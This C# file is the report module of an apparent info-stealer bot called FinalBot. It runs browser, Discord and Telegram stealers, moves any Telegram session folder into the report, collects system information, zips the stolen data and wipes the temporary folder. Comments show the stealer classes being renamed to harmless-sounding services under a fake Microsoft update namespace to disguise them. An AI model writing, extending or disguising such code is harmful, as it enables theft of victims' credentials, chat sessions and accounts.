using System;
using System.IO;
using System.IO.Compression;
using Microsoft.UpdateService.Modules; // New using directive
using FinalBot.Modules;

namespace FinalBot
{
    public static class ReportManager
    {
        public static async Task<string?> CreateFullReport()
        {
            string tempDir = Path.Combine(Path.GetTempPath(), $"Report_{DateTime.Now:yyyyMMdd_HHmmss}");
            Directory.CreateDirectory(tempDir);

            try 
            {
                // 1. Run Stealers
                var browserService = new DataService(); // Renamed from BrowserStealer
                string browserReport = await browserService.RunAll(); // Updated variable name
                File.WriteAllText(Path.Combine(tempDir, "Browsers.txt"), browserReport);

                var discordService = new ChatService(); // Renamed from DiscordStealer
                string discordReport = await discordService.Run(); // Updated variable name
                File.WriteAllText(Path.Combine(tempDir, "Discord.txt"), discordReport);

                var telegramService = new MessengerService(); // Renamed from TelegramStealer
                string tgResult = telegramService.Run(); // Updated variable name
                if (!tgResult.StartsWith("❌") && Directory.Exists(tgResult))
                {
                    // If Telegram session found, move to report dir
                    Directory.Move(tgResult, Path.Combine(tempDir, "Telegram"));
                }

                // WalletStealer (CryptoService) is not explicitly used in the original CreateFullReport method,
                // so no direct change is made here based on the provided context.
                // If it were used, it would be instantiated as 'new CryptoService()'.

                // Others (assuming they might exist or handled similarly)
                // var fileStealer = new FileStealer();
                // await fileStealer.Run(tempDir);


                // 2. System Info
                string sysInfo = SystemInfoModule.GetSystemInfo();
                File.WriteAllText(Path.Combine(tempDir, "System_Info.txt"), sysInfo);

                // 3. ZIP everything
                string zipPath = tempDir + ".zip";
                if (File.Exists(zipPath)) File.Delete(zipPath);
                ZipFile.CreateFromDirectory(tempDir, zipPath);

                // 4. Cleanup temp dir
                CleanupService.WipeDirectory(tempDir);

                return zipPath;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[REPORT ERROR] {ex.Message}");
                return null;
            }
        }
    }
}
